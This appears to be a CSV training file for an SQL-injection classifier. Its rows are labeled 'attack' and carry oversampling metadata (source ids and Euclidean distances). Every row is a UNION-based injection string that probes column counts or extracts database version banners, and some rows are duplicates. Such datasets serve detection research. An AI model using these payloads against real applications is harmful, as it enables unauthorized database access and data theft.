id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000195,attack,union,"-3037  )   where 9024  =  9024 union all select 9024,9024--",nearest_attack_euclidean,R000491,0.4848511775056444
SMOTE_000196,attack,union,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",nearest_attack_euclidean,R000851,0.23267807745247618
SMOTE_000197,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R001064,0.050522392046062806
SMOTE_000198,attack,union,"-9622' union all select 7208,7208,7208,7208#",nearest_attack_euclidean,R000263,0.008404544563028218
SMOTE_000199,attack,union,"-5292'  )   union all select 1439,1439,1439,1439#",nearest_attack_euclidean,R001202,8.429369702178807e-08
SMOTE_000200,attack,union,"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001125,0.421018444239321
SMOTE_000201,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null#",nearest_attack_euclidean,R001201,0.07200416288354679
SMOTE_000202,attack,union,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",nearest_attack_euclidean,R000469,0.5387058283278063
SMOTE_000203,attack,union,"-7544""   )    )    union all select 3808,3808,3808,3808--",nearest_attack_euclidean,R000878,0.009661103347934855
SMOTE_000204,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000478,0.039499856818057906
SMOTE_000205,attack,union," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000025,0.025744117243251635
SMOTE_000206,attack,union,"1'  )   as jysm where 8961  =  8961 union all select null,null#",nearest_attack_euclidean,R000664,0.28762297359691213
SMOTE_000207,attack,union,-6473' union all select 7537#,nearest_attack_euclidean,R001197,0.18500401591852655
SMOTE_000208,attack,union,"1'+  (  select 'qvif' where 1758  =  1758 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001292,0.18733578770436454
SMOTE_000209,attack,union,"-5372""  )   as wlqm where 2432  =  2432 union all select 2432,2432,2432,2432,2432,2432#",nearest_attack_euclidean,R000511,0.40690676057170155
SMOTE_000210,attack,union,"1%' union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000741,0.02037704730698358
SMOTE_000211,attack,union,"-7371'  )   union all select 4531,4531,4531#",nearest_attack_euclidean,R000216,0.36920587615902095
SMOTE_000212,attack,union,"1""  )   where 4822  =  4822 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000443,0.5090990168017042
SMOTE_000213,attack,union,"1%'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R001248,0.22636059881571546
SMOTE_000214,attack,union,"1'  )   as ildf where 5545  =  5545 union all select null,null,null,null#",nearest_attack_euclidean,R000946,0.08235129748860871
SMOTE_000215,attack,union,"-2434  )   union all select 8310,8310,8310,8310,8310--",nearest_attack_euclidean,R000715,0.33082213782688286
SMOTE_000216,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000501,0.05082686514100751
SMOTE_000217,attack,union,"-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--",nearest_attack_euclidean,R000768,0.6922179457983607
SMOTE_000218,attack,union,"1'+  (  select 'rguk' where 6019  =  6019 union all select null,null,null,null,null--",nearest_attack_euclidean,R000950,0.29473183620399274
SMOTE_000219,attack,union,"-9408%""   )    )    union all select 1841,1841,1841,1841,1841,1841--",nearest_attack_euclidean,R001547,0.052765563059696784
SMOTE_000220,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R001086,0.43922213007040783
SMOTE_000221,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R001332,0.3804217426201639
SMOTE_000222,attack,union,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",nearest_attack_euclidean,R000649,0.07885665541545761
SMOTE_000223,attack,union,"1%""  )   union all select null#",nearest_attack_euclidean,R000695,0.5624632447123034
SMOTE_000224,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000322,0.07034308206842106
SMOTE_000225,attack,union,"1%'  )   union all select null,null,null--",nearest_attack_euclidean,R000455,0.3020830197501872
SMOTE_000226,attack,union,"-1985%'   )    )     )   union all select 3051,3051,3051--",nearest_attack_euclidean,R001304,0.29519253652577176
SMOTE_000227,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R001086,0.2418179923444461
SMOTE_000228,attack,union,"-3860' union all select 3510,3510,3510#",nearest_attack_euclidean,R000686,0.21452361337286405
SMOTE_000229,attack,union,"-7083 union all select 7705,7705,7705,7705,7705#",nearest_attack_euclidean,R001163,0.3723883459262658
SMOTE_000230,attack,union,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",nearest_attack_euclidean,R000903,0.029534837217410174
SMOTE_000231,attack,union,"1   )    )    as zmsa where 6909  =  6909 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001075,0.06137501659724966
SMOTE_000232,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R000916,0.14230445356452381
SMOTE_000233,attack,union,"1' where 6721  =  6721 union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000891,0.16817828071551294
SMOTE_000234,attack,union,"-9725'  )   union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",nearest_attack_euclidean,R000326,0.20747307271043985
SMOTE_000235,attack,union,"-9175'   )    )    union all select 6174,6174,6174,6174--",nearest_attack_euclidean,R001552,0.3685327866365715
SMOTE_000236,attack,union,"1%'   )    )     )   union all select null,null,null#",nearest_attack_euclidean,R000638,0.30090204161760764
SMOTE_000237,attack,union,"-8771""   )    )    union all select 6302,6302,6302,6302,6302#",nearest_attack_euclidean,R000646,0.2695579450826686
SMOTE_000238,attack,union,"-2116%'   )    )     )   union all select 7119,7119,7119,7119,7119--",nearest_attack_euclidean,R000547,0.4150693717596932
SMOTE_000239,attack,union,"-5300' union all select 2750,2750,2750,2750,2750,2750--",nearest_attack_euclidean,R000558,0.09172945141157832
SMOTE_000240,attack,union,"-8735'   )    )    union all select 3262,3262,3262--",nearest_attack_euclidean,R001004,0.37088066897870037
SMOTE_000241,attack,union,"1  )   as lejp where 5238  =  5238 union all select null,null,null,null,null#",nearest_attack_euclidean,R001413,0.33534775420025975
SMOTE_000242,attack,union,"1%""  )   union all select null,null--",nearest_attack_euclidean,R001417,0.09346516040525542
SMOTE_000243,attack,union,"1""  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001288,0.03254968556223459
SMOTE_000244,attack,union,"-2784'   )    )    union all select 6775,6775,6775,6775,6775,6775,6775,6775,6775#",nearest_attack_euclidean,R001510,0.0006689167661274647
SMOTE_000245,attack,union,"-3037  )   where 9024  =  9024 union all select 9024,9024--",nearest_attack_euclidean,R000491,0.028781054431244967
SMOTE_000246,attack,union,"-5728  )   where 8663  =  8663 union all select 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663#",nearest_attack_euclidean,R000923,0.07041309504992554
SMOTE_000247,attack,union," select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000144,0.01930606230629578
SMOTE_000248,attack,union,"-4756""   )    )    union all select 6846,6846,6846,6846,6846,6846,6846#",nearest_attack_euclidean,R001338,0.6417366676110126
SMOTE_000249,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R001086,0.4437884964016477
SMOTE_000250,attack,union,"1'+  (  select gajr where 6653  =  6653 union all select null,null,null,null#",nearest_attack_euclidean,R000365,0.30665747662974363
SMOTE_000251,attack,union,"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",nearest_attack_euclidean,R000342,0.08255759014097583
SMOTE_000252,attack,union,"-9337  )   union all select 5648,5648,5648,5648,5648#",nearest_attack_euclidean,R000461,0.7476411545553027
SMOTE_000253,attack,union," select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000117,0.34644776271905997
SMOTE_000254,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000035,7.100990987560215
SMOTE_000255,attack,union,"1'+  (  select 'vabj' where 7178  =  7178 union all select null,null,null,null,null#",nearest_attack_euclidean,R000991,0.054521620482041906
SMOTE_000256,attack,union,"-2605%'   )    )     )   union all select 4738,4738#",nearest_attack_euclidean,R000797,0.4176445691271765
SMOTE_000257,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000003,1.6858739404357614e-07
SMOTE_000258,attack,union,"-3035""  )   union all select 7912,7912,7912#",nearest_attack_euclidean,R001153,0.24373502866889976
SMOTE_000259,attack,union,"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001125,0.15825029622363104
SMOTE_000260,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R001287,0.05411193351822634
SMOTE_000261,attack,union,"-2226%""   )    )    union all select 1018,1018,1018,1018--",nearest_attack_euclidean,R000383,0.32123857644258474
SMOTE_000262,attack,union,"-1339   )    )     )   union all select 2938,2938,2938,2938,2938,2938#",nearest_attack_euclidean,R000255,0.003277831905269162
SMOTE_000263,attack,union,"1 where 2363  =  2363 union all select null,null,null,null,null--",nearest_attack_euclidean,R001275,0.08252852493397485
SMOTE_000264,attack,union,"1 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000407,0.27659444641275804
SMOTE_000265,attack,union,"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",nearest_attack_euclidean,R000704,0.8937415371169276
SMOTE_000266,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000350,0.018116200142882278
SMOTE_000267,attack,union," select * from users where id  =  1 or 1#""1 union select null,version  (    )   -- 1",nearest_attack_euclidean,R000161,0.0047717600167721036
SMOTE_000268,attack,union," select * from users where id  =  1.  union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000122,0.25090192172902326
SMOTE_000269,attack,union,"1%' union all select null,null,null,null,null--",nearest_attack_euclidean,R000545,0.03834506399342092
SMOTE_000270,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001278,1.1623847228769433
SMOTE_000271,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R001379,0.45659617280006165
SMOTE_000272,attack,union,"1'  )   as ildf where 5545  =  5545 union all select null,null,null,null#",nearest_attack_euclidean,R000946,0.20051440380983263
SMOTE_000273,attack,union," select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",nearest_attack_euclidean,R000192,1.2059330466974256
SMOTE_000274,attack,union,"-6527'   )    )    union all select 5053,5053,5053,5053--",nearest_attack_euclidean,R000961,0.23826768245355062
SMOTE_000275,attack,union,"-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#",nearest_attack_euclidean,R000921,0.053819428665628534
SMOTE_000276,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000728,0.025323529685025825
SMOTE_000277,attack,union,"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",nearest_attack_euclidean,R000704,0.789626546945256
SMOTE_000278,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000850,0.052138033426869054
SMOTE_000279,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000017,9.905916531048142
SMOTE_000280,attack,union,"-7544""   )    )    union all select 3808,3808,3808,3808--",nearest_attack_euclidean,R000878,0.007019251268606858
SMOTE_000281,attack,union,"1  )   where 3740  =  3740 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000818,0.2372366044105345
SMOTE_000282,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R001199,0.23649697203168318
SMOTE_000283,attack,union,"1'||  (  select 'fdkl' where 4572  =  4572 union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000966,0.24406194993277097
SMOTE_000284,attack,union,"1%""   )    )    union all select null#",nearest_attack_euclidean,R000969,0.7698387756996
SMOTE_000285,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000470,0.5295810038219494
SMOTE_000286,attack,union,"-6680""   )    )     )   union all select 2564,2564,2564,2564,2564,2564#",nearest_attack_euclidean,R000284,0.2882952901317328
SMOTE_000287,attack,union,"1   )    )    as huxq where 7451  =  7451 union all select null,null,null--",nearest_attack_euclidean,R000392,0.8846632463106961
SMOTE_000288,attack,union,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",nearest_attack_euclidean,R000483,0.19703871373979207
SMOTE_000289,attack,union,"-7795""  )   where 1712  =  1712 union all select 1712,1712,1712,1712#",nearest_attack_euclidean,R000371,0.8465503384111269
SMOTE_000290,attack,union,-2569' union all select 4484--,nearest_attack_euclidean,R000348,0.09147179752749784
SMOTE_000291,attack,union,"-8069   )    )    as sxbn where 7689  =  7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--",nearest_attack_euclidean,R001060,0.7683935517093552
SMOTE_000292,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001265,0.17069910368083124
SMOTE_000293,attack,union,"-9859""   )    )     )   union all select 6595,6595,6595,6595,6595,6595,6595#",nearest_attack_euclidean,R000234,0.3286709182666224
SMOTE_000294,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000094,0.2665156413700891
SMOTE_000295,attack,union,-2452'   )    )     )   union all select 1951--,nearest_attack_euclidean,R000492,0.028503711340831166
SMOTE_000296,attack,union,"-9937'   )    )    union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",nearest_attack_euclidean,R001192,0.48000696063593157
SMOTE_000297,attack,union,"-6007""   )    )    union all select 6019,6019,6019,6019,6019,6019,6019,6019--",nearest_attack_euclidean,R000433,0.15831900039976962
SMOTE_000298,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000403,0.3016899828659981
SMOTE_000299,attack,union,-2483' where 1327  =  1327 union all select 1327#,nearest_attack_euclidean,R001283,0.9304168874063282
SMOTE_000300,attack,union,"1'  )   as dwgv where 1525  =  1525 union all select null,null--",nearest_attack_euclidean,R000593,0.5003824790069106
SMOTE_000301,attack,union,"-5169""   )    )    union all select 6198,6198,6198,6198--",nearest_attack_euclidean,R001270,0.1283306393715527
SMOTE_000302,attack,union,"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",nearest_attack_euclidean,R001159,0.002060139302048749
SMOTE_000303,attack,union,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",nearest_attack_euclidean,R000690,0.14455120587391243
SMOTE_000304,attack,union,1  )   as ratg where 3033  =  3033 union all select null--,nearest_attack_euclidean,R000657,0.8550141847493542
SMOTE_000305,attack,union,"1"" union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000862,0.5738272914189322
SMOTE_000306,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001443,0.8124970610320447
SMOTE_000307,attack,union,"1' where 2391  =  2391 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000967,0.13746330361359343
SMOTE_000308,attack,union,"-6357""  )   union all select 9767,9767,9767,9767,9767,9767,9767,9767,9767#",nearest_attack_euclidean,R001126,0.3809311528228565
SMOTE_000309,attack,union,"-4285'   )    )     )   union all select 8819,8819,8819,8819,8819,8819,8819,8819#",nearest_attack_euclidean,R000802,0.10679217866644175
SMOTE_000310,attack,union,"1'||  (  select 'pnsw' where 2103  =  2103 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001495,0.35865255695302856
SMOTE_000311,attack,union,"1' where 1093  =  1093 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001044,0.07701477372419999
SMOTE_000312,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000397,0.23598788735569157
SMOTE_000313,attack,union,"1  )   as asmt where 4986  =  4986 union all select null,null#",nearest_attack_euclidean,R000826,0.22057075779507312
SMOTE_000314,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000014,0.2872067827532081
SMOTE_000315,attack,union,"-2434'   )    )     )   union all select 5509,5509,5509,5509,5509,5509,5509--",nearest_attack_euclidean,R000795,0.17158607250867144
SMOTE_000316,attack,union," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000032,0.20507215094973627
SMOTE_000317,attack,union,"1' union all select null,null,null,null,null#",nearest_attack_euclidean,R000968,0.4442412991499379
SMOTE_000318,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001481,0.00591091211618901
SMOTE_000319,attack,union,"-4947' in boolean mode  )   union all select 3314,3314#",nearest_attack_euclidean,R000556,0.27804082075966596
SMOTE_000320,attack,union,"1'+  (  select vupb where 9575  =  9575 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001161,0.9771377057125674
SMOTE_000321,attack,union,"-8684 union all select 9519,9519,9519,9519--",nearest_attack_euclidean,R000941,0.2571249191178176
SMOTE_000322,attack,union,"-7635"" union all select 1284,1284,1284,1284,1284,1284#",nearest_attack_euclidean,R000245,0.21817925052230497
SMOTE_000323,attack,union,"1  )   as cfnz where 6065  =  6065 union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001364,0.043689553600244894
SMOTE_000324,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001481,0.2398147881470376
SMOTE_000325,attack,union,"1%"" union all select null,null,null,null#",nearest_attack_euclidean,R001333,0.12525539376934383
SMOTE_000326,attack,union,"-5657'   )    )     )   union all select 8071,8071,8071,8071,8071,8071,8071,8071#",nearest_attack_euclidean,R000897,0.21116530797048078
SMOTE_000327,attack,union,"-6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271#",nearest_attack_euclidean,R001289,0.15746383882781637
SMOTE_000328,attack,union," select * from users where id  =  '1' union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000162,1.3146179380735277
SMOTE_000329,attack,union,"1%'   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R001177,0.06643594997965273
SMOTE_000330,attack,union,"1""   )    )     )   union all select null,null,null,null,null--",nearest_attack_euclidean,R000214,0.20240927864319053
SMOTE_000331,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R001036,0.02845450344379527
SMOTE_000332,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R001435,0.06510124541594686
SMOTE_000333,attack,union,"-8667'+  (  select ymmg where 6132  =  6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132#",nearest_attack_euclidean,R001449,0.617356591823446
SMOTE_000334,attack,union," select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000013,1.3350057728651306
SMOTE_000335,attack,union,-2050' union all select 5606#,nearest_attack_euclidean,R000428,1.458889815748926
SMOTE_000336,attack,union,"1%""   )    )    union all select null,null#",nearest_attack_euclidean,R000588,0.6827713981555248
SMOTE_000337,attack,union,"-4905"" union all select 6082,6082--",nearest_attack_euclidean,R001088,0.04948708382818037
SMOTE_000338,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000345,0.1049357252348293
SMOTE_000339,attack,union,"-8580'  )   union all select 3428,3428,3428,3428,3428,3428,3428,3428,3428#",nearest_attack_euclidean,R001109,0.14081202701846873
SMOTE_000340,attack,union,"1 where 1326  =  1326 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000771,0.17990497691817725
SMOTE_000341,attack,union,"-8349  )   union all select 8126,8126#",nearest_attack_euclidean,R000275,0.3883236962850897
SMOTE_000342,attack,union,"-9953'||  (  select 'zljk' where 2886  =  2886 union all select 2886,2886,2886,2886,2886,2886,2886,2886,2886,2886#",nearest_attack_euclidean,R001411,0.6327884361663857
SMOTE_000343,attack,union,"1'+  (  select rwse where 9843  =  9843 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000330,0.26213110856387756
SMOTE_000344,attack,union,"-1337""  )   union all select 7508--",nearest_attack_euclidean,R000694,0.0
SMOTE_000345,attack,union,"-1868   )    )    union all select 1859,1859--",nearest_attack_euclidean,R000752,0.7914857849264666
SMOTE_000346,attack,union,"1 where 4944  =  4944 union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001138,0.050818793866124035
SMOTE_000347,attack,union,"1""   )    )     )   union all select null,null,null,null--",nearest_attack_euclidean,R000827,0.22481500089365114
SMOTE_000348,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R001351,0.44609313144980567
SMOTE_000349,attack,union,"-1339   )    )     )   union all select 6318,6318,6318,6318,6318,6318,6318,6318,6318#",nearest_attack_euclidean,R001386,0.7614527583720448
SMOTE_000350,attack,union,"-7868' in boolean mode  )   union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117#",nearest_attack_euclidean,R000482,0.0017498394991278987
SMOTE_000351,attack,union,"-9725'  )   union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",nearest_attack_euclidean,R000326,0.12050829423039772
SMOTE_000352,attack,union,"-7347""   )    )    union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",nearest_attack_euclidean,R000977,0.07808949713184664
SMOTE_000353,attack,union," select * from users where id  =  '1' or   (  \  )    =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000188,0.00728713503901866
SMOTE_000354,attack,union,"1%"" union all select null,null,null--",nearest_attack_euclidean,R000643,0.1909607196006578
SMOTE_000355,attack,union,"-8042  )   as zhoq where 2120  =  2120 union all select 2120,2120,2120,2120,2120,2120,2120,2120,2120,2120--",nearest_attack_euclidean,R000983,0.550619728241735
SMOTE_000356,attack,union,"1"" union all select null,null--",nearest_attack_euclidean,R000591,0.21219936645862622
SMOTE_000357,attack,union," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",nearest_attack_euclidean,R000112,0.11525784773005132
SMOTE_000358,attack,union,"1%"" union all select null,null,null#",nearest_attack_euclidean,R001223,1.0685066656238003
SMOTE_000359,attack,union," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",nearest_attack_euclidean,R000071,0.04766941820608028
SMOTE_000360,attack,union,"-3699%'   )    )     )   union all select 8241,8241,8241,8241,8241,8241,8241,8241,8241#",nearest_attack_euclidean,R001132,0.43560293659821575
SMOTE_000361,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000053,0.211423985802912
SMOTE_000362,attack,union,"1""   )    )    union all select null--",nearest_attack_euclidean,R001136,0.5350934446102502
SMOTE_000363,attack,union,-8760  )   where 8277  =  8277 union all select 8277--,nearest_attack_euclidean,R001220,0.7662410922521486
SMOTE_000364,attack,union,"-6368' union all select 6529,6529,6529--",nearest_attack_euclidean,R000552,0.08271077678237057
SMOTE_000365,attack,union,"-7083 union all select 7705,7705,7705,7705,7705#",nearest_attack_euclidean,R001163,0.23677248123191114
SMOTE_000366,attack,union,"-5130'   )    )    union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",nearest_attack_euclidean,R000535,0.09156139573650779
SMOTE_000367,attack,union,"-7418 union all select 1340,1340,1340,1340,1340#",nearest_attack_euclidean,R001175,0.2787333210552809
SMOTE_000368,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R001511,0.16665724587244124
SMOTE_000369,attack,union,"-7531'   )    )     )   union all select 6900,6900,6900,6900,6900,6900,6900,6900,6900#",nearest_attack_euclidean,R001058,0.16837726953319507
SMOTE_000370,attack,union,"-1106'   )    )    union all select 2855,2855,2855,2855,2855,2855,2855#",nearest_attack_euclidean,R000873,0.22401379365745666
SMOTE_000371,attack,union,"1'   )    )    as umah where 3781  =  3781 union all select null,null,null,null#",nearest_attack_euclidean,R000700,0.1551393485063613
SMOTE_000372,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000838,0.047219551683735705
SMOTE_000373,attack,union,"1""   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000945,0.24125793834325285
SMOTE_000374,attack,union,"-8153' where 2436  =  2436 union all select 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#",nearest_attack_euclidean,R000529,0.15238533685028957
SMOTE_000375,attack,union," select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000044,0.0034654975542492525
SMOTE_000376,attack,union,-7940'  )   union all select 6024--,nearest_attack_euclidean,R000259,0.031869704307473525
SMOTE_000377,attack,union," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000019,1.2279814695395241
SMOTE_000378,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000468,0.07010347398543136
SMOTE_000379,attack,union,"1 where 2751  =  2751 union all select null,null,null,null--",nearest_attack_euclidean,R000672,0.2084621405470086
SMOTE_000380,attack,union,"-8971'||  (  select 'smyx' where 7970  =  7970 union all select 7970,7970,7970,7970,7970,7970,7970#",nearest_attack_euclidean,R000374,0.40368037727109585
SMOTE_000381,attack,union," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000032,0.0830735970103702
SMOTE_000382,attack,union,"-5706""   )    )    union all select 2013,2013,2013,2013#",nearest_attack_euclidean,R000410,0.41221796223456914
SMOTE_000383,attack,union,-7707'   )    )    union all select 3172#,nearest_attack_euclidean,R001408,0.11202142814176892
SMOTE_000384,attack,union,"-9237'  )   union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",nearest_attack_euclidean,R000833,0.015671146667028703
SMOTE_000385,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R001225,0.05658794685689501
SMOTE_000386,attack,union,"1'||  (  select 'ukfj' where 7133  =  7133 union all select null,null,null#",nearest_attack_euclidean,R000971,0.2525997732038663
SMOTE_000387,attack,union,"-8793' where 3853  =  3853 union all select 3853,3853,3853,3853,3853,3853,3853,3853#",nearest_attack_euclidean,R001426,0.3947646957374415
SMOTE_000388,attack,union,"-8651""  )   where 8391  =  8391 union all select 8391,8391#",nearest_attack_euclidean,R000800,0.400819691416511
SMOTE_000389,attack,union,"-1598   )    )     )   union all select 9418,9418,9418,9418,9418,9418,9418#",nearest_attack_euclidean,R000808,0.5633957339207597
SMOTE_000390,attack,union,"-1802%'   )    )    union all select 1002,1002,1002,1002,1002,1002,1002#",nearest_attack_euclidean,R001343,0.45720990931249234
